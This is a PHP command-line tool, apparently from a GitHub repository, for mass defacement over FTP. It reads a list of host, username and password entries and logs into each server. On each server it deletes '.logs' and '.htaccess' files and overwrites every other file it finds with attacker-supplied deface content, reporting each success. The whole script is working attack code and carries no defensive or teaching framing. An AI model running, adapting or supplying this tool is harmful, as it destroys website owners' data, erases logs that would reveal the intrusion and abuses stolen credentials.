<?php 
	/*
	* github.com/JoaoArtur -> By Keni (João Artur)
	*/

	error_reporting(0);
	set_time_limit(0);

	if (count($argv) == 1) {
		$contexto    = "::::::::::::::::::::::::::\n";
		$contexto   .= "       By Joao Artur      \n";
		$contexto   .= "php ftpmassdeface.php help\n";
		$contexto   .= "::::::::::::::::::::::::::\n";
		print($contexto);
	} else {
		if ($argv[1] == "help") {
			$contexto  = "Uso:\n";
			$contexto .= "php ftpmassdeface.php lista.txt index.html\nphp ftpmassdeface.php ftps defacecode";
			print($contexto);
		} else {

			$lista         = $argv[1];
			$deface        = $argv[2];
			$arquivotarget = $argv[3];

			$lerlista = explode("\n", file_get_contents($lista));
			foreach ($lerlista as $linha) {
				$h        = explode(":", $linha);
				$host     = $h[0];
				$usuario  = $h[1];
				$senha    = $h[2];

				$conectar = ftp_connect($host);
				$logar    = ftp_login($conectar, $usuario, $senha);

				if ($logar == true) {
					if (file_exists($deface)) {
						$items=array();
						foreach (ftp_rawlist($conectar, "/",true) as $pastasarq) {
							if (strstr($pastasarq,".")) {
								$c = preg_split("/\s+/", $pastasarq);
								@list($item['rights'],$item['number'],$item['user'],$item['group'],$item['size'],$item['month'],$item['day'],$item['time'],$item['filename']) = $c;
								@$item['type'] = $c[0]{0} === 'd' ? 'directory' : 'file';
								@array_splice($c, 0,8);
								@$items[implode(" ", $c)] = $item;
								$pa=$item['filename'];
								$arquivonome = "ftp://$usuario:$senha@$host/$pa";
								$m=fopen($arquivonome,"r");
								$conteudo=fread($m, filesize($arquivonome));
								fclose($m);
								$defacecode=file_get_contents($deface);
								if ($pa == ".logs" || $pa == ".htaccess") {
									if (unlink($arquivonome)) {
										print("[-] $host->$usuario->$senha    =>    $pa removido\n");
									} else {
										print("[-] $host->$usuario->$senha    =>    $pa alteracao bloqueada\n");
									}
								} else {
									$fw=fopen($pa, "w+");
									$fb=fwrite($fw, $defacecode);
									fclose($fw);
									if (ftp_put($conectar, $pa, $pa, FTP_ASCII)) {
										print("[+] $host->$usuario->$senha    =>    $pa alterado!\n");
									} else {
										print("[-] $host->$usuario->$senha    =>    $pa nao alterado.\n");
									}
									unlink($pa);
								}

							}
						}
					} else {
						print("Arquivo $deface nao existe");
						exit;
					}
				} else {
					print("Nao foi possivel conectar a $host\n");
				}

				ftp_close($conectar);
			}

		}
	}
?>